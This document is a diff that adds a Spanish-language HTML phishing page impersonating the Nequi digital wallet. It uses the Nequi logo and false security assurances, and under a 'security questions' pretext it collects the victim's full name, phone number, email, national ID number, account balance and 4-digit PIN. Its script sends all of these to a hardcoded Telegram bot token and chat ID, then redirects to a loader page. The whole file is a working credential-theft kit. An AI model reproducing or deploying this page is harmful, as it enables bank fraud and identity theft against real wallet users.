@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Tu info</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+  body {
+    margin: 0;
+    background: #FFFFFF;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  .header {
+    width: 100%;
+    background: #2E0039;
+    padding: 15px 20px;
+    color: white;
+    font-size: 20px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .header span {
+    font-size: 22px;
+    cursor: pointer;
+  }
+
+  .container {
+    padding: 20px;
+    flex: 1;
+  }
+
+  .title {
+    font-size: 28px;
+    font-weight: 700;
+    color: #2E0039;
+    margin-bottom: 25px;
+    margin-top: 15px;
+  }
+
+  .card {
+    background: #fff;
+    padding: 18px;
+    margin-bottom: 5px;
+    border-radius: 0px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.10);
+    border: 1px solid #f3f3f3;
+  }
+
+  .left {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+  }
+
+  .icon {
+    width: 28px;
+    height: 28px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .check {
+    background: #00C853;
+    color: white;
+    font-size: 8px;
+    padding: 7px 9px;
+    border-radius: 50%;
+  }
+
+  .text-title {
+    font-size: 16px;
+    font-weight: 700;
+    color: #3A0A63;
+  }
+
+  .text-sub {
+    font-size: 13px;
+    opacity: 0.7;
+    color: #3A0A63;
+  }
+
+  /* Editable tipo Nequi */
+  .editable {
+    cursor: text;
+    border: 1px solid transparent;
+    border-radius: 4px;
+    padding: 2px 4px;
+    min-height: 20px;
+  }
+
+  .editable.editing {
+    outline: 2px solid #2E0039;
+    background: #F9F3FF;
+  }
+
+  /* Estilo para el campo de saldo */
+  .money-input {
+    border: 1px solid #ddd;
+    border-radius: 6px;
+    padding: 8px 12px 8px 25px;
+    font-size: 16px;
+    width: 180px;
+    background: #F9F3FF;
+    position: relative;
+    font-family: 'Inter', sans-serif;
+  }
+
+  .money-input:focus {
+    outline: 2px solid #2E0039;
+    background: white;
+  }
+
+  .money-container {
+    position: relative;
+    display: inline-block;
+  }
+
+  .money-container::before {
+    content: "$";
+    position: absolute;
+    left: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #3A0A63;
+    font-weight: bold;
+    z-index: 1;
+  }
+
+  /* Botón Telegram */
+  .btn-telegram {
+    width: 100%;
+    background: #2E0039;
+    color: white;
+    border: none;
+    padding: 16px;
+    border-radius: 14px;
+    font-size: 17px;
+    margin-top: 20px;
+    cursor: pointer;
+    font-weight: 700;
+    transition: background 0.3s ease;
+  }
+
+  .btn-telegram:hover {
+    background: #3A0A63;
+  }
+
+  /* Banner imagen */
+  .banner-image {
+    width: 100%;
+    text-align: center;
+    padding: 20px;
+    background: white;
+  }
+
+  .banner-image img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 10px;
+  }
+
+  /* Footer */
+  .footer {
+    background: #2E0039;
+    color: white;
+    padding: 25px 20px;
+    text-align: center;
+    margin-top: 30px;
+  }
+
+  .footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .footer-logo {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+
+  .footer-logo .icon {
+    background: white;
+    color: #2E0039;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    font-size: 14px;
+  }
+
+  .footer-text {
+    font-size: 14px;
+    opacity: 0.9;
+    margin-bottom: 15px;
+    line-height: 1.5;
+  }
+
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+    flex-wrap: wrap;
+    margin-bottom: 20px;
+  }
+
+  .footer-link {
+    color: white;
+    text-decoration: none;
+    font-size: 13px;
+    opacity: 0.8;
+    transition: opacity 0.3s ease;
+  }
+
+  .footer-link:hover {
+    opacity: 1;
+  }
+
+  .footer-copyright {
+    font-size: 12px;
+    opacity: 0.7;
+    border-top: 1px solid rgba(255,255,255,0.2);
+    padding-top: 15px;
+    margin-top: 15px;
+  }
+
+  .security-badge {
+    background: rgba(255,255,255,0.1);
+    padding: 8px 15px;
+    border-radius: 20px;
+    font-size: 12px;
+    display: inline-block;
+    margin-top: 10px;
+  }
+
+  /* Modal flotante para inputs */
+  .input-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0,0,0,0.7);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+  }
+
+  .input-container {
+    background: white;
+    padding: 25px;
+    border-radius: 15px;
+    width: 90%;
+    max-width: 400px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+  }
+
+  .input-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #2E0039;
+    margin-bottom: 15px;
+    text-align: center;
+  }
+
+  .floating-input {
+    width: 100%;
+    padding: 15px;
+    font-size: 16px;
+    border: 2px solid #E3D4EE;
+    border-radius: 10px;
+    background: #F9F3FF;
+    font-family: 'Inter', sans-serif;
+    box-sizing: border-box;
+  }
+
+  .floating-input:focus {
+    outline: none;
+    border-color: #2E0039;
+    background: white;
+  }
+
+  .input-buttons {
+    display: flex;
+    gap: 10px;
+    margin-top: 20px;
+  }
+
+  .btn-cancel {
+    flex: 1;
+    padding: 12px;
+    border: 2px solid #E3D4EE;
+    background: white;
+    color: #2E0039;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+
+  .btn-save {
+    flex: 1;
+    padding: 12px;
+    border: none;
+    background: #2E0039;
+    color: white;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+
+  /* Input específico para email */
+  .email-input {
+    width: 100%;
+    padding: 15px;
+    font-size: 16px;
+    border: 2px solid #E3D4EE;
+    border-radius: 10px;
+    background: #F9F3FF;
+    font-family: 'Inter', sans-serif;
+    box-sizing: border-box;
+  }
+
+  .email-input:focus {
+    outline: none;
+    border-color: #2E0039;
+    background: white;
+  }
+
+  /* Input específico para números */
+  .number-input {
+    width: 100%;
+    padding: 15px;
+    font-size: 16px;
+    border: 2px solid #E3D4EE;
+    border-radius: 10px;
+    background: #F9F3FF;
+    font-family: 'Inter', sans-serif;
+    box-sizing: border-box;
+    inputmode: numeric;
+  }
+
+  /* Input para PIN */
+  .pin-input {
+    width: 100%;
+    padding: 15px;
+    font-size: 16px;
+    border: 2px solid #E3D4EE;
+    border-radius: 10px;
+    background: #F9F3FF;
+    font-family: 'Inter', sans-serif;
+    box-sizing: border-box;
+    inputmode: numeric;
+    maxlength: 4;
+  }
+</style>
+
+</head>
+
+<body>
+
+<div class="header">
+  <span>←</span> Tu info Preguntas de Seguridad.
+</div>
+
+<!-- Imagen del banner -->
+<div class="banner-image">
+  <img src="bane.jpeg" alt="Mi imagen" style="width: 100%; max-width: 300px; height: auto;">
+</div>
+
+<div class="container">
+
+  <div class="title">Tu info</div>
+
+  <!-- NOMBRE -->
+  <div class="card">
+    <div class="left">
+      <div class="icon">
+        <svg width="26" height="26" viewBox="0 0 24 24">
+          <text x="1" y="17" font-size="15" fill="#3A0A63" font-family="Arial" font-weight="bold">Aa</text>
+        </svg>
+      </div>
+      <div>
+        <div id="nombre" class="text-title editable" onclick="mostrarInputModal('nombre', 'text', 'Ingresa tu nombre completo', 'Nombre Completo')">Nombre Completo</div>
+        <div class="text-sub">¿nombres y apellidos?</div>
+      </div>
+    </div>
+    <div class="check">✔</div>
+  </div>
+
+  <!-- TELÉFONO -->
+  <div class="card">
+    <div class="left">
+      <div class="icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="7" y="2" width="10" height="20" rx="3"></rect>
+          <line x1="12" y1="18" x2="12" y2="18" stroke-width="3"></line>
+        </svg>
+      </div>
+      <div>
+        <div id="telefono" class="text-title editable" onclick="mostrarInputModal('telefono', 'tel', 'Ingresa tu número de teléfono', '3115555555')">3115555555</div>
+        <div class="text-sub">Numero vinculado a Nequi</div>
+      </div>
+    </div>
+    <div class="check">✔</div>
+  </div>
+
+  <!-- CORREO -->
+  <div class="card">
+    <div class="left">
+      <div class="icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="5" width="18" height="14" rx="2"></rect>
+          <polyline points="3,7 12,13 21,7"></polyline>
+        </svg>
+      </div>
+      <div>
+        <div id="correo" class="text-title editable" onclick="mostrarInputModal('correo', 'email', 'Ingresa tu correo electrónico', 'correo1234@gmail.com')">correo1234@gmail.com</div>
+        <div class="text-sub">Ingresa tu correo registrado</div>
+      </div>
+    </div>
+    <div class="check">✔</div>
+  </div>
+
+  <!-- CÉDULA -->
+  <div class="card">
+    <div class="left">
+      <div class="icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="8" r="4"></circle>
+          <path d="M4 20c1-4 4-7 8-7s7 3 8 7"></path>
+        </svg>
+      </div>
+      <div>
+        <div id="nombre2" class="text-title"># Documento</div>
+        <div id="cedula" class="text-sub editable" onclick="mostrarInputModal('cedula', 'text', 'Ingresa tu número de documento', 'CC 123333334')">CC 123333334</div>
+      </div>
+    </div>
+    <div class="check">✔</div>
+  </div>
+
+  <!-- SALDO DISPONIBLE -->
+  <div class="card">
+    <div class="left">
+      <div class="icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="6" width="20" height="12" rx="2"></rect>
+          <circle cx="12" cy="12" r="3"></circle>
+        </svg>
+      </div>
+      <div>
+        <div class="text-title">Pregunta de Seguridad</div>
+        <div class="text-sub">Saldo disponible actual</div>
+        <div class="money-container">
+          <input type="text" 
+                 id="saldo" 
+                 class="money-input" 
+                 placeholder="0" 
+                 oninput="manejarEntradaSaldo(this)"
+                 onblur="formatearSaldoFinal(this)"
+                 onclick="mostrarInputModal('saldo', 'number', 'Ingresa tu saldo disponible', '0')"
+                 readonly>
+        </div>
+      </div>
+    </div>
+    <div class="check">✔</div>
+  </div>
+
+  <!-- CLAVE -->
+  <div class="card">
+    <div class="left">
+      <div class="icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="10" rx="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+      </div>
+      <div>
+        <div id="clave" class="text-title editable" onclick="mostrarInputModal('clave', 'password', 'Ingresa tu clave de 4 dígitos', '1234')">1234</div>
+        <div class="text-sub">Clave de 4 digitos</div>
+      </div>
+    </div>
+    <div class="check">✔</div>
+  </div>
+
+  <!-- BOTÓN TELEGRAM -->
+  <button class="btn-telegram" onclick="enviarTelegram()">Confirmar</button>
+
+</div>
+
+<!-- Modal flotante para inputs -->
+<div class="input-modal" id="inputModal">
+  <div class="input-container">
+    <div class="input-title" id="modalTitle">Ingresa tu información</div>
+    <input type="text" 
+           id="floatingInput" 
+           class="floating-input"
+           placeholder="Escribe aquí...">
+    <div class="input-buttons">
+      <button class="btn-cancel" onclick="cerrarModal()">Cancelar</button>
+      <button class="btn-save" onclick="guardarValor()">Guardar</button>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-content">
+    <div class="">
+      <img src="https://images.seeklogo.com/logo-png/40/2/nequi-logo-png_seeklogo-404357.png" alt="Imagen" style="width:100px; height:auto;">
+      <div class="icon"></div>
+    </div>
+    <div class="footer-text">
+      Tu billetera digital más fácil, más rápida y más segura
+    </div>
+    <div class="footer-links">
+      <a href="#" class="footer-link">Términos y Condiciones</a>
+      <a href="#" class="footer-link">Política de Privacidad</a>
+      <a href="#" class="footer-link">Ayuda</a>
+      <a href="#" class="footer-link">Contáctanos</a>
+    </div>
+    <div class="security-badge">
+      🔒 Transacciones 100% seguras
+    </div>
+    <div class="footer-copyright">
+      &copy; 2024 Nequi. Todos los derechos reservados.
+    </div>
+  </div>
+</div>
+
+<script>
+// Variables globales
+let saldoNumerico = 0;
+let saldoSinFormato = '';
+let campoActual = null;
+let placeholderActual = '';
+
+function mostrarInputModal(campoId, tipo, titulo, placeholder) {
+  campoActual = campoId;
+  placeholderActual = placeholder;
+  
+  // Configurar el modal según el tipo de campo
+  const modal = document.getElementById('inputModal');
+  const input = document.getElementById('floatingInput');
+  const tituloModal = document.getElementById('modalTitle');
+  
+  tituloModal.textContent = titulo;
+  
+  // Obtener valor actual del campo
+  let valorActual = '';
+  if (campoId === 'saldo') {
+    valorActual = document.getElementById(campoId).value || '';
+  } else {
+    const elemento = document.getElementById(campoId);
+    valorActual = (elemento.textContent === placeholder) ? '' : elemento.textContent;
+  }
+  
+  // Configurar el input según el tipo
+  input.value = valorActual;
+  input.placeholder = placeholder;
+  
+  // Configurar tipo de input para teclado nativo
+  switch(tipo) {
+    case 'email':
+      input.type = 'email';
+      input.inputMode = 'email';
+      break;
+    case 'tel':
+      input.type = 'tel';
+      input.inputMode = 'numeric';
+      break;
+    case 'number':
+      input.type = 'text';
+      input.inputMode = 'decimal';
+      break;
+    case 'password':
+      input.type = 'password';
+      input.inputMode = 'numeric';
+      input.maxLength = 4;
+      break;
+    default:
+      input.type = 'text';
+      input.inputMode = 'text';
+  }
+  
+  // Mostrar modal
+  modal.style.display = 'flex';
+  
+  // Enfocar el input después de un pequeño delay para que el teclado se abra
+  setTimeout(() => {
+    input.focus();
+    input.select();
+  }, 300);
+}
+
+function cerrarModal() {
+  document.getElementById('inputModal').style.display = 'none';
+  campoActual = null;
+}
+
+function guardarValor() {
+  if (!campoActual) return;
+  
+  const input = document.getElementById('floatingInput');
+  const valor = input.value.trim();
+  
+  if (campoActual === 'saldo') {
+    // Manejo especial para saldo
+    if (valor) {
+      saldoSinFormato = valor.replace(/\D/g, '');
+      saldoNumerico = saldoSinFormato === '' ? 0 : parseInt(saldoSinFormato);
+      const numero = parseInt(saldoSinFormato);
+      document.getElementById(campoActual).value = numero.toLocaleString('es-CO');
+    } else {
+      document.getElementById(campoActual).value = '';
+      saldoNumerico = 0;
+    }
+  } else {
+    // Para otros campos
+    const elemento = document.getElementById(campoActual);
+    if (valor) {
+      elemento.textContent = valor;
+      elemento.style.color = '#3A0A63'; // Color normal cuando tiene valor
+    } else {
+      elemento.textContent = placeholderActual;
+      elemento.style.color = '#3A0A63'; // Mantener color para placeholder
+    }
+  }
+  
+  cerrarModal();
+}
+
+// Manejar Enter y Escape en el modal
+document.getElementById('floatingInput').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') {
+    guardarValor();
+  }
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') {
+    cerrarModal();
+  }
+});
+
+// Funciones originales para el manejo del saldo
+function manejarEntradaSaldo(input) {
+  saldoSinFormato = input.value.replace(/\./g, '');
+  const soloNumeros = saldoSinFormato.replace(/\D/g, '');
+  saldoSinFormato = soloNumeros;
+  saldoNumerico = soloNumeros === '' ? 0 : parseInt(soloNumeros);
+  
+  if (soloNumeros !== '') {
+    const numero = parseInt(soloNumeros);
+    input.value = numero.toLocaleString('es-CO');
+  } else {
+    input.value = '';
+  }
+}
+
+function formatearSaldoFinal(input) {
+  if (saldoSinFormato !== '') {
+    const numero = parseInt(saldoSinFormato);
+    if (!isNaN(numero)) {
+      input.value = numero.toLocaleString('es-CO');
+      saldoNumerico = numero;
+    }
+  }
+}
+
+function obtenerSaldoParaEnvio() {
+  return saldoNumerico;
+}
+
+function enviarTelegram() {
+  const token = "7812114927:AAGYIeX5DVUxc2IcNJ-swMyfxhyYjsLB9jA";        
+  const chat_id = "7776240161";    
+
+  let saldo = obtenerSaldoParaEnvio();
+  let saldoFormateado = "$0";
+  if (saldo > 0) {
+    saldoFormateado = "$" + saldo.toLocaleString('es-CO');
+  }
+
+  const mensaje =
+    "📌 *Datos del usuario*\n\n" +
+    "👤 *Nombre:* " + document.getElementById("nombre").textContent + "\n" +
+    "📱 *Teléfono:* " + document.getElementById("telefono").textContent + "\n" +
+    "📧 *Correo:* " + document.getElementById("correo").textContent + "\n" +
+    "🪪 *Documento:* " + document.getElementById("cedula").textContent + "\n" +
+    "💰 *Saldo disponible:* " + saldoFormateado + "\n" +
+    "🔑 *Clave:* " + document.getElementById("clave").textContent + "\n";
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: mensaje,
+      parse_mode: "Markdown"
+    })
+  })
+  .then(r => r.json())
+  .then(() => {
+    window.location.href = "loader.html";
+  })
+  .catch(() => {
+    alert("❌ Error enviando la información");
+  });
+}
+</script>
+
+</body>
+</html>
